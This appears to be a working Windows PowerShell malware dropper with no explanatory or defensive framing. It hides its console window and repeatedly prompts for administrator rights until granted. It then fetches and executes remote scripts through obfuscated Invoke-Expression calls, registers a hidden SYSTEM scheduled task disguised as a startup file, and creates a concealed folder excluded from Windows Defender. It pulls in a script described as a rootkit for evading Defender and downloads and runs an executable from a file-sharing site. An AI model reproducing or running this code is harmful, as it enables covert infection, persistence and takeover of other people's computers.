Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@
# aaaa
[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     while(1) {
         try {
             $code = ("https://raw.githubusercontent.com/gingogaming-dot/test/refs/heads/main/a.ps1")
             $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
             Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
             Clear-Host
             exit;
         } catch {}
     }
 }

$task_name = "simpletask"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/gingogaming-dot/test/refs/heads/main/a.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force
Write-Host "[!] Persistence Added" -ForegroundColor Green

$rdir = "$env:SystemDrive\ProgramData\Steam"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir
$folderPath = $dir
iwr "https://pastie.io/raw/evijeu" | iex # Sử dụng RootKit v3 để bypass windows defender

$filePath = "$folderPath\$77.exe"
$url = "https://anonsharing.com/file/67a19d8f109e689b/plugins.exe"

# Tạo thư mục nếu chưa tồn tại
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force
}

# Kiểm tra nếu file chưa tồn tại thì tải về
if (!(Test-Path $filePath)) {
    Invoke-WebRequest -Uri $url -OutFile $filePath
}

Start-Process -FilePath $filePath -NoNewWindow
